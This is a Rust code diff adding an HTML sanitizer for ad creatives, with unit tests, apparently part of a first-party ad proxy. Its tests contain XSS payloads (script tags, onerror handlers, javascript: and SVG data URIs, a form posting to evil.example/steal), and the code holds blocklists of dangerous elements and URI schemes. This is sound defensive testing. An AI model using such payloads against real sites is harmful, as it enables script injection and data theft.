@@ -303,6 +303,198 @@ pub fn rewrite_css_body(settings: &Settings, css: &str) -> String {
     rewrite_style_urls(settings, css)
 }
 
+/// Maximum byte length of creative HTML accepted by [`sanitize_creative_html`].
+///
+/// Inputs larger than this are rejected (empty string returned) to prevent unbounded
+/// allocations on the hot path. Fastly Compute enforces upstream request-body limits,
+/// but this guard protects internal callers too.
+const MAX_CREATIVE_SIZE: usize = 1024 * 1024; // 1 MiB
+
+/// Returns `true` if a lowercased `data:` URI points to a safe, non-executable MIME type.
+///
+/// Only well-known raster image formats are allowed. `data:image/svg+xml` is **excluded**
+/// because SVG documents can contain `<script>` and event-handler attributes.
+fn is_safe_data_uri(lower: &str) -> bool {
+    // Extract the MIME type — everything between "data:" and the first ";" or ","
+    let mime = lower
+        .trim_start_matches("data:")
+        .split([';', ','])
+        .next()
+        .expect("should have at least one split segment");
+    matches!(
+        mime,
+        "image/png" | "image/jpeg" | "image/gif" | "image/webp" | "image/avif"
+    )
+}
+
+/// Strip dangerous elements and attributes from ad creative HTML.
+///
+/// Removes elements that can execute code or exfiltrate data (`script`, `iframe`,
+/// `object`, `embed`, `base`, `meta`, `form`, `link`, `style`, `noscript`) and strips `on*` event-handler
+/// attributes and dangerous URI schemes from all remaining elements:
+/// - `javascript:`, `vbscript:`
+/// - `data:` URIs except the safe raster image subtypes (`image/png`, `image/jpeg`,
+///   `image/gif`, `image/webp`, `image/avif`). `data:image/svg+xml` is blocked because
+///   SVG can contain executable content.
+/// - Inline `style` attributes containing `expression()`, `javascript:`, `vbscript:`,
+///   or `data:text/` / `data:application/` / `data:image/svg` URL patterns.
+///
+/// This runs as the first pass in the creative pipeline, before URL rewriting, so the
+/// rewriter only ever sees clean markup.
+///
+/// Inputs larger than [`MAX_CREATIVE_SIZE`] are rejected (empty string returned) with a warning.
+/// On parse errors the markup is also rejected (empty string returned) with a warning.
+#[must_use]
+pub fn sanitize_creative_html(markup: &str) -> String {
+    if markup.len() > MAX_CREATIVE_SIZE {
+        log::warn!(
+            "sanitize_creative_html: creative too large ({} bytes > {} byte limit); rejecting",
+            markup.len(),
+            MAX_CREATIVE_SIZE
+        );
+        return String::new();
+    }
+
+    let mut out = Vec::with_capacity(markup.len());
+
+    let mut rewriter = HtmlRewriter::new(
+        HtmlSettings {
+            element_content_handlers: vec![
+                // Remove executable/dangerous elements along with their inner content.
+                // - <script>, <iframe>, <object>, <embed>: direct execution vectors.
+                // - <base>: rewrites all relative URLs, undermining the proxy rewriter.
+                // - <meta>: can trigger redirects (http-equiv=refresh) or inject CSP.
+                // - <form>: action/formaction can exfiltrate data; stripped to match the
+                //   iframe sandbox which omits allow-forms.
+                // - <link>: external stylesheet/resource loading.
+                // - <style>: CSS expressions, @import, and url() data exfiltration.
+                // - <noscript>: rendered when scripts are disabled (always the case
+                //   inside a sandbox without allow-scripts); strip to prevent parser
+                //   differential attacks.
+                element!(
+                    "script, iframe, object, embed, base, meta, form, link, style, noscript",
+                    |el| {
+                        el.remove();
+                        Ok(())
+                    }
+                ),
+                // Strip event-handler attributes and dangerous URI scheme values from
+                // every element. Note: lol_html calls this handler for the opening tag of
+                // each element including those already marked for removal above (e.g.
+                // <script>). Attribute mutations on removed elements are benign — lol_html
+                // discards the tag — but the handler still fires. This is intentional and
+                // harmless.
+                element!("*", |el| {
+                    let on_attrs: Vec<String> = el
+                        .attributes()
+                        .iter()
+                        .filter(|a| a.name().to_ascii_lowercase().starts_with("on"))
+                        .map(|a| a.name().to_string())
+                        .collect();
+                    for attr in &on_attrs {
+                        el.remove_attribute(attr);
+                    }
+
+                    for attr_name in &[
+                        "href",
+                        "src",
+                        // data-src is used by lazy-loading libraries; treat like src.
+                        "data-src",
+                        "action",
+                        "formaction",
+                        "background",
+                        "poster",
+                        "xlink:href",
+                    ] {
+                        if let Some(val) = el.get_attribute(attr_name) {
+                            let lower = val.trim().to_ascii_lowercase();
+                            // Strip executable URI schemes. data:image/svg+xml is blocked
+                            // even though it starts with "data:image/" because SVG can
+                            // embed script. Only safe raster formats pass through.
+                            if lower.starts_with("javascript:")
+                                || lower.starts_with("vbscript:")
+                                || (lower.starts_with("data:") && !is_safe_data_uri(&lower))
+                            {
+                                el.remove_attribute(attr_name);
+                            }
+                        }
+                    }
+
+                    // srcset and imagesrcset are comma-separated lists of "url [descriptor]"
+                    // entries. Check each URL individually so a dangerous URI anywhere in
+                    // the list is caught, not just one at the start of the attribute string.
+                    // Intentionally fail-closed: if any entry is dangerous, the entire
+                    // attribute is removed rather than filtering individual entries. A mixed
+                    // safe/dangerous srcset is a strong indicator of a malicious creative,
+                    // so dropping the whole attribute is the correct response.
+                    // imagesrcset appears on <link> and <source> elements; <link> is already
+                    // removed above, but <source> is not, so both attributes are checked here.
+                    for attr_name in ["srcset", "imagesrcset"] {
+                        if let Some(val) = el.get_attribute(attr_name) {
+                            let is_dangerous = val.split(',').any(|entry| {
+                                let url = entry
+                                    .trim()
+                                    .split_ascii_whitespace()
+                                    .next()
+                                    .unwrap_or("")
+                                    .to_ascii_lowercase();
+                                url.starts_with("javascript:")
+                                    || url.starts_with("vbscript:")
+                                    || (url.starts_with("data:") && !is_safe_data_uri(&url))
+                            });
+                            if is_dangerous {
+                                el.remove_attribute(attr_name);
+                            }
+                        }
+                    }
+
+                    // Strip inline styles containing CSS expressions, JS URIs, or
+                    // data: URIs with executable MIME types (SVG and text/application
+                    // subtypes can carry HTML/JS payloads inside CSS url() values).
+                    // NOTE: This uses simple substring matching on the lowercased value,
+                    // which does not handle CSS escape sequences (e.g. `\65xpression(`)
+                    // or comments (e.g. `expr/**/ession(`). That is acceptable: CSS
+                    // expression() is IE6-8 only and the iframe sandbox's absence of
+                    // allow-scripts prevents execution even if an obfuscated value were
+                    // to slip through. The sandbox is the primary mitigation; this check
+                    // is defense-in-depth for obvious patterns.
+                    if let Some(style) = el.get_attribute("style") {
+                        let lower = style.to_ascii_lowercase();
+                        if lower.contains("expression(")
+                            || lower.contains("javascript:")
+                            || lower.contains("vbscript:")
+                            || lower.contains("data:text/")
+                            || lower.contains("data:application/")
+                            || lower.contains("data:image/svg")
+                        {
+                            el.remove_attribute("style");
+                        }
+                    }
+
+                    Ok(())
+                }),
+            ],
+            ..HtmlSettings::default()
+        },
+        |c: &[u8]| out.extend_from_slice(c),
+    );
+
+    // Short-circuit: do not call end() after a failed write(), as lol_html's
+    // rewriter is in an error state and may produce garbage output. Fail closed —
+    // return empty string so the caller rejects the creative rather than serving
+    // unsanitized markup.
+    if rewriter.write(markup.as_bytes()).is_err() || rewriter.end().is_err() {
+        log::warn!("sanitize_creative_html: html parse error; rejecting markup");
+        return String::new();
+    }
+
+    // lol_html always emits valid UTF-8 when given valid UTF-8 input (Rust &str
+    // is always valid UTF-8), so this error path is unreachable in practice.
+    // Return empty string rather than the original markup so the caller fails
+    // closed if lol_html ever produces unexpected non-UTF-8 output.
+    String::from_utf8(out).unwrap_or_default()
+}
+
 /// Rewrite ad creative HTML to first-party endpoints.
 /// - 1x1 `<img>` pixels → `/first-party/proxy?tsurl=&lt;base-url&gt;&lt;params&gt;&tstoken=&lt;sig&gt;`
 /// - Non-pixel absolute images → `/first-party/proxy?tsurl=&lt;base-url&gt;&lt;params&gt;&tstoken=&lt;sig&gt;`
@@ -581,7 +773,9 @@ impl StreamProcessor for CreativeCssProcessor<'_> {
 
 #[cfg(test)]
 mod tests {
-    use super::{rewrite_creative_html, rewrite_srcset, rewrite_style_urls, to_abs};
+    use super::{
+        rewrite_creative_html, rewrite_srcset, rewrite_style_urls, sanitize_creative_html, to_abs,
+    };
 
     #[test]
     fn rewrites_width_height_attrs() {
@@ -1281,5 +1475,428 @@ mod tests {
         assert!(out.contains("/first-party/click?tsurl="));
         assert!(out.contains("advertiser.example.com"));
         assert!(out.contains("data-tsclick=\"/first-party/click"));
+    }
+
+    // ── sanitize_creative_html tests ────────────────────────────────────────
+
+    #[test]
+    fn sanitize_passes_safe_static_markup() {
+        let html = r#"<div><img src="https://example.com/ad.png" alt="ad"><a href="https://example.com">click</a></div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(out.contains("<img"), "should preserve img tag");
+        assert!(
+            out.contains("https://example.com/ad.png"),
+            "should preserve safe src"
+        );
+        assert!(
+            out.contains("https://example.com"),
+            "should preserve safe href"
+        );
+    }
+
+    #[test]
+    fn sanitize_removes_script_tag() {
+        let html = r#"<div>ad content</div><script>alert("xss")</script>"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<script"), "should remove script element");
+        assert!(!out.contains("alert"), "should remove script content");
+        assert!(out.contains("ad content"), "should preserve safe content");
+    }
+
+    #[test]
+    fn sanitize_removes_iframe_element() {
+        let html = r#"<div>ad</div><iframe src="https://evil.example/"></iframe>"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<iframe"), "should remove iframe element");
+        assert!(out.contains("ad"), "should preserve safe content");
+    }
+
+    #[test]
+    fn sanitize_removes_object_and_embed() {
+        let html = r#"<object data="https://evil.example/swf"></object><embed src="evil.swf">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<object"), "should remove object element");
+        assert!(!out.contains("<embed"), "should remove embed element");
+    }
+
+    #[test]
+    fn sanitize_removes_form_element() {
+        let html = r#"<form action="https://evil.example/steal"><input name="cc"></form>"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<form"), "should remove form element");
+    }
+
+    #[test]
+    fn sanitize_removes_meta_and_base() {
+        let html = r#"<meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<meta"), "should remove meta element");
+        assert!(!out.contains("<base"), "should remove base element");
+    }
+
+    #[test]
+    fn sanitize_strips_on_event_attributes() {
+        let html = r#"<img src="/track.png" onerror="alert(1)" onload="evil()">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("onerror"), "should strip onerror attribute");
+        assert!(!out.contains("onload"), "should strip onload attribute");
+        assert!(out.contains("<img"), "should preserve img element");
+    }
+
+    #[test]
+    fn sanitize_strips_javascript_href() {
+        let html = r#"<a href="javascript:alert(1)">click</a>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: href"
+        );
+        assert!(out.contains("click"), "should preserve link text");
+    }
+
+    #[test]
+    fn sanitize_strips_vbscript_src() {
+        let html = r#"<img src="vbscript:MsgBox(1)">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("vbscript:"), "should strip vbscript: src");
+    }
+
+    #[test]
+    fn sanitize_strips_data_uri_src() {
+        let html = r#"<img src="data:text/html,<script>alert(1)</script>">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("data:text/html"), "should strip data: src");
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_data_src_attribute() {
+        // data-src is used by lazy-loaders; dangerous URI schemes must be stripped.
+        let html = r#"<img data-src="javascript:alert(1)" alt="ad">"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: in data-src"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_srcset_leading_entry() {
+        // A javascript: URI at the start of srcset must be stripped.
+        let html =
+            r#"<img srcset="javascript:alert(1) 1x, https://cdn.example/img.png 2x" alt="ad">"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("srcset"),
+            "should remove srcset with leading dangerous URL"
+        );
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: from srcset"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_srcset_non_leading_entry() {
+        // A javascript: URI that is NOT the first entry must also be stripped.
+        // This was the gap in the previous starts_with-only check.
+        let html =
+            r#"<img srcset="https://cdn.example/small.png 1x, javascript:alert(1) 2x" alt="ad">"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("srcset"),
+            "should remove srcset with non-leading dangerous URL"
+        );
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: from non-leading srcset entry"
+        );
+    }
+
+    #[test]
+    fn sanitize_preserves_safe_srcset() {
+        // A fully safe srcset must be preserved.
+        let html = r#"<img srcset="https://cdn.example/small.png 1x, https://cdn.example/large.png 2x" alt="ad">"#;
+        let out = sanitize_creative_html(html);
+        assert!(out.contains("srcset"), "should preserve safe srcset");
+        assert!(
+            out.contains("small.png"),
+            "should preserve first srcset URL"
+        );
+        assert!(
+            out.contains("large.png"),
+            "should preserve second srcset URL"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_imagesrcset_on_source() {
+        // <source> is not in the element removal list, so imagesrcset must be
+        // sanitized by the attribute handler. <link imagesrcset> is already
+        // covered by link removal, but <source> is not.
+        let html = r#"<picture><source imagesrcset="javascript:alert(1) 1x" /></picture>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("imagesrcset"),
+            "should strip dangerous imagesrcset attribute"
+        );
+        assert!(
+            !out.contains("javascript:"),
+            "should not contain javascript: after stripping imagesrcset"
+        );
+        assert!(
+            out.contains("<source"),
+            "should preserve the source element"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_imagesrcset_non_leading_entry() {
+        // A dangerous URI that is NOT the first entry must also be caught.
+        let html = r#"<picture><source imagesrcset="https://cdn.example/img.png 1x, javascript:alert(1) 2x" /></picture>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("imagesrcset"),
+            "should remove imagesrcset with non-leading dangerous URL"
+        );
+    }
+
+    #[test]
+    fn sanitize_preserves_safe_imagesrcset() {
+        let html = r#"<picture><source imagesrcset="https://cdn.example/img-1x.png 1x, https://cdn.example/img-2x.png 2x" /></picture>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            out.contains("imagesrcset"),
+            "should preserve safe imagesrcset"
+        );
+        assert!(
+            out.contains("img-1x.png"),
+            "should preserve first candidate"
+        );
+        assert!(
+            out.contains("img-2x.png"),
+            "should preserve second candidate"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_data_svg_imagesrcset() {
+        // data:image/svg+xml can embed script — must be rejected even though it
+        // starts with "data:image/". Mirrors sanitize_strips_data_svg_src coverage
+        // for imagesrcset.
+        let html = r#"<picture><source imagesrcset="data:image/svg+xml,<svg onload=alert(1)> 1x" /></picture>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("imagesrcset"),
+            "should strip data:image/svg imagesrcset"
+        );
+        assert!(
+            !out.contains("data:image/svg"),
+            "should not contain svg data URI after stripping"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_dangerous_inline_style() {
+        let html = r#"<div style="background:expression(alert(1))">ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("expression("),
+            "should strip expression() in style"
+        );
+        assert!(out.contains("ad"), "should preserve element content");
+    }
+
+    #[test]
+    fn sanitize_strips_javascript_in_style() {
+        let html = r#"<div style="background:javascript:alert(1)">ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: in style"
+        );
+    }
+
+    #[test]
+    fn sanitize_preserves_safe_inline_style() {
+        let html = r#"<div style="color:red;font-size:14px">styled ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(out.contains("style="), "should preserve safe inline style");
+        assert!(out.contains("color:red"), "should preserve style value");
+    }
+
+    #[test]
+    fn sanitize_preserves_mailto_href() {
+        let html = r#"<a href="mailto:contact@example.com">email</a>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            out.contains("mailto:contact@example.com"),
+            "should preserve mailto href"
+        );
+    }
+
+    #[test]
+    fn sanitize_passes_through_empty_input() {
+        let out = sanitize_creative_html("");
+        assert_eq!(out, "", "should return empty string unchanged");
+    }
+
+    #[test]
+    fn sanitize_removes_link_element() {
+        let html = r#"<link rel="stylesheet" href="https://evil.example/evil.css">"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<link"), "should remove link element");
+    }
+
+    #[test]
+    fn sanitize_removes_style_element() {
+        // <style> blocks can carry CSS expressions, @import, and url() payloads.
+        // Treated the same as <link>: stripped entirely.
+        let html = r#"<div>ad</div><style>div { background: expression(alert(1)) }</style>"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<style"), "should remove style element");
+        assert!(
+            !out.contains("expression("),
+            "should remove style element content"
+        );
+        assert!(out.contains("ad"), "should preserve safe content");
+    }
+
+    #[test]
+    fn sanitize_removes_style_element_with_at_import() {
+        let html = r#"<p>ad</p><style>@import url("https://evil.example/exfil.css")</style>"#;
+        let out = sanitize_creative_html(html);
+        assert!(!out.contains("<style"), "should remove style element");
+        assert!(!out.contains("@import"), "should remove @import content");
+    }
+
+    #[test]
+    fn sanitize_strips_on_event_attributes_case_insensitive() {
+        // on* matching must be case-insensitive: ONCLICK, OnClick, etc.
+        let html = r#"<div ONCLICK="alert(1)" OnMouseOver="evil()">ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.to_ascii_lowercase().contains("onclick"),
+            "should strip ONCLICK"
+        );
+        assert!(
+            !out.to_ascii_lowercase().contains("onmouseover"),
+            "should strip OnMouseOver"
+        );
+        assert!(out.contains("ad"), "should preserve element content");
+    }
+
+    #[test]
+    fn sanitize_strips_javascript_in_action_and_formaction() {
+        let html = r#"<form action="javascript:steal()"><button formaction="javascript:also()">go</button></form>"#;
+        let out = sanitize_creative_html(html);
+        // form is fully removed; button survives but formaction is stripped
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: URIs"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_javascript_in_background_and_poster() {
+        let html = r#"<table background="javascript:xss()"><video poster="javascript:xss()"></video></table>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: in background and poster"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_javascript_in_xlink_href() {
+        let html = r#"<svg><use xlink:href="javascript:alert(1)"/></svg>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip javascript: in xlink:href"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_whitespace_padded_dangerous_uri() {
+        // Dangerous URIs may have leading whitespace before the scheme.
+        let html = r#"<a href="  javascript:alert(1)">click</a>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("javascript:"),
+            "should strip whitespace-padded javascript: href"
+        );
+    }
+
+    #[test]
+    fn sanitize_preserves_data_image_src() {
+        // Safe raster formats must pass through unchanged.
+        for mime in &[
+            "image/png",
+            "image/jpeg",
+            "image/gif",
+            "image/webp",
+            "image/avif",
+        ] {
+            let html = format!(r#"<img src="data:{mime};base64,AAAA">"#);
+            let out = sanitize_creative_html(&html);
+            assert!(
+                out.contains(&format!("data:{mime};base64,")),
+                "should preserve data:{mime} src"
+            );
+        }
+    }
+
+    #[test]
+    fn sanitize_strips_data_svg_src() {
+        // data:image/svg+xml can embed <script> and event handlers — must be stripped.
+        let html = r#"<img src="data:image/svg+xml,<svg onload='alert(1)'/>">ad</img>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("data:image/svg+xml"),
+            "should strip data:image/svg+xml src"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_data_application_href() {
+        // data:application/* can carry JS payloads and must be stripped.
+        let html = r#"<a href="data:application/javascript,alert(1)">click</a>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("data:application/"),
+            "should strip data:application href"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_data_text_in_style_url() {
+        // data:text/* inside a CSS url() value can carry executable HTML — must be stripped.
+        let html =
+            r#"<div style="background: url('data:text/html,<script>xss</script>')">ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("data:text/"),
+            "should strip data:text/ in style url()"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_data_svg_in_style_url() {
+        // data:image/svg+xml inside a CSS url() can execute JS — must be stripped.
+        let html =
+            r#"<div style="background: url('data:image/svg+xml,<svg onload=alert(1)>')">ad</div>"#;
+        let out = sanitize_creative_html(html);
+        assert!(
+            !out.contains("data:image/svg"),
+            "should strip data:image/svg in style url()"
+        );
+    }
+
+    #[test]
+    fn sanitize_returns_empty_string_when_over_size_limit() {
+        // Inputs exceeding MAX_CREATIVE_SIZE must be rejected (fail closed).
+        let large = "A".repeat(super::MAX_CREATIVE_SIZE + 1);
+        let out = sanitize_creative_html(&large);
+        assert_eq!(out, "", "should reject oversized input with empty string");
     }
 }
